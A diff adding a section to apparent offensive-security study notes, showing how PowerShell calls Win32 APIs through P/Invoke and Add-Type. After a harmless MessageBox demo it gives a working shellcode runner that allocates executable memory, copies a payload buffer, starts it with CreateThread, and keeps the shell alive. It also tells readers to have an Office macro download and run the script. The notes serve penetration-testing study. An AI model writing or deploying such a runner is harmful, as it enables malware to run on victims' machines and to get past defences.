@@ -458,3 +458,129 @@ Explanation:
 &nbsp;
 
 # Shellcode Runner using Powershell
+
+## Calling Win32 APIs from Powershell
+
+- Powershell cannot natively interact with the Win32 API, but using the .NET framework we can use C# in the powershell session.
+- In C#, we can declare and import the Win32 API using the DllImportAttribute class.
+- As done in VBA, here also we have to convert C data types to C# data types.
+- This can easily be done by Microsoft Platform Invocation Services, P/Invoke
+
+> C# statements for importing Win32 Libraries using the P/Invoke can be found here : https://www.pinvoke.net
+
+Example :
+
+For the MessageBox function from the User32.dll ,we can use the above website to fetch the import statement.
+
+Import Statement :
+
+    [DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
+    public static extern int MessageBox(IntPtr hWnd, String text, String caption, uint type);
+
+&nbsp;
+
+C# Code :
+
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class User32 {
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        public static extern int MessageBox(IntPtr hWnd, String text,
+        String caption, int options);
+    }
+
+Explanation :
+
+1. We first import the System and System.Runtime.InteropServices which contain the P/Invoke APIs
+2. A class with the name User32 is then created with the P/Invoke statement to import the MessageBox function from the user32.dll
+
+> Note: The class name can be anything, here it is User32 for better understading.
+
+&nbsp;
+
+Powershell Code :
+
+    $User32 = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class User32 {
+            [DllImport("user32.dll", CharSet=CharSet.Auto)]
+            public static extern int MessageBox(IntPtr hWnd, String text,
+            String caption, int options);
+        }
+    "@
+    Add-Type $User32
+
+    [User32]::MessageBox(0, "This is an alert", "MyBox", 0)
+
+Explanation :
+
+1. A variable called User32 contains the C# code.
+2. Add-Type is used to add a .NET class to the current powershell session. It compiles the C# code using the .Net Framework and then adds it to the Current session of Powershell for furthur use.
+3. We can then call the function using the _[\<classname>]:\<FunctionName>(arguments)_
+4. In the above code snippet, we can call the MessageBox Function with the syntax specified above.
+
+> More on Add-Type : https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2
+
+> The "@" character is used to specify a code block in powershell
+
+&nbsp;
+
+## Shellcode Runner in Powershell
+
+- The methodology is same as the one in VBA: Allocate memory > Copy shellcode to memory > Execute shellcode
+- We will be using Win32 API _VirtualAlloc_ and _CreateThread_, but for copying the shellcode we will use .Net Copy method function from the _System.Runtime.InteropServices.Marshal_
+- We will also use the _WaitForSingleObject_ function from the _kernel32.dll_ to prevent the shell from dying.
+
+&nbsp;
+
+Powershell code :
+
+    $Kernel32 = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class Kernel32 {
+            [DllImport("kernel32")]
+            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+            [DllImport("kernel32", CharSet=CharSet.Ansi)]
+            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+            [DllImport("kernel32.dll", SetLastError=true)]
+            public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        }
+    "@
+    Add-Type $Kernel32
+
+    [Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...
+    $size = $buf.Length
+    [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+    $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+
+    [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+
+&nbsp;
+
+Now just download this powershell script using Macros and execute it
+
+&nbsp;
+
+Explanation:
+
+1. A variable called Kernel32 has the C# code.
+2. In the C# code, _System_ and _System.Runtime.InteropServices_ is imported. The Win32 APIs for _VirtualAlloc_ , _CreateThread_ and _WaitForSingleObject_ is imported using it's following P/Invoke Statements.
+3. The Kernel32 powershell variable is then compiled and imported to the current session using the Add-Type command.
+4. The $buf variable stored the generated payload
+5. $size variable stores the length of the buffer
+6. _VirtualAlloc_ is then called to allocate space of size $size with 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (read, write and execute)
+7. The .Net Copy function is then used to copy the shellcode to the allocated memory.
+8. A thread is created using the _CreateThread_ and is executed at the address where the allocation is done.
+9. The _WaitForSingleObject_ is called with the arguments $thandle which specifies the created thread and the time (0xFFFFFFFF), which specifies that the thread never quit unless we exit our shell.
+
+> Note : In-Depth explaination of the _VirtualAlloc_ and _CreateThread_ can be found [here](#in-memory-shellcode-runner-in-vba)
+
+&nbsp;
+
+## In-Memory ShellCode Runner in Powershell
